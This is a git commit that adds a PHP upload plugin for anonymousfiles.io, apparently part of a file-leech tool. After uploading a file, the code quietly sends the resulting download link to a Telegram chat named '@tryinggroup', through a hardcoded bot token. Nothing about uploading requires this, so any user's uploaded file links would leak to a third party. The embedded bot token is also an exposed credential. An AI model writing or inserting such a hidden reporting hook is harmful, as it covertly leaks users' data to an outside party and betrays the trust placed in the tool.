c4deb0e6427aef2321e6f0c57f829bcbee5df254
yashssonani <49947849+yashssonani@users.noreply.github.com>
2020-01-27 20:31:16 +0530

    Create anonymousfiles.io.php

---
+++ hosts/upload/anonymousfiles.io.php
@@ -0,0 +1,25 @@
+<?php
+
+  $_GET['proxy'] = isset($_GET['proxy']) ? $_GET['proxy'] : '';
+  $not_done = true;
+  $continue_up = true;
+
+  $tgtoken = "853422522:AAGm1HLEfd8HY9ovg5sojnldNtn8uJJbvg4";	
+	
+  $tgchatid = "@tryinggroup";
+
+  $uploc = 'https://api.anonymousfiles.io/';
+	$url = parse_url($uploc);
+	echo "<script type='text/javascript'>document.getElementById('info').style.display='none';</script>\n";
+	$upfiles = upfile($url['host'], 0, $url['path'], 0, 0, 0, $lfile, $lname, 'file','', 0, 0, 0, $url['scheme']);
+	echo "<script type='text/javascript'>document.getElementById('progressblock').style.display='none';</script>\n";
+	
+  $anonn = strpbrk($upfiles,'{');
+  $anonnn = json_decode($anonn,true);
+  $anonnnn = $anonnn['url'];
+  $akgh = "https://api.telegram.org/bot".$tgtoken."/sendmessage?chat_id=".$tgchatid."&text=".$anonnnn;
+  $akju = cURL($akgh);
+        
+        
+        
+?>
